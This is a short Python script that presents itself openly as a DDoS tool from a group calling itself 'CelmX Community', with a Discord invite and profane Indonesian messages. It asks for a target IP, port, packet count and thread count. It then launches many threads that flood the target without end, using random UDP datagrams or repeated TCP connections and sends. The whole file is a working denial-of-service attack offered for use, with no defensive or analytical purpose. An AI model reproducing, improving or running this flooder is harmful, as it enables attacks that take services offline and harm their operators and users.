#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by CelmX Community
#Join My T3Am : https://discord.gg/2UrS8JM4
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by CelmX99")
print("CELMX COMMUNITY")
print("NYOLONG DOSA AOWKWOW ")
ip = str(input(" DdosAttackByCelmX99 | Ip:"))
port = int(input(" DdosAttackByCelmX99 | Port:"))
choice = str(input(" DdosAttackByCelmX99 | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByCelmX99 | Packets:"))
threads = int(input(" DdosAttackByCelmX99 | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | CelmXNihBos |")
		except:
			print("[!] | Server down anjing!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" CelmX99 nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
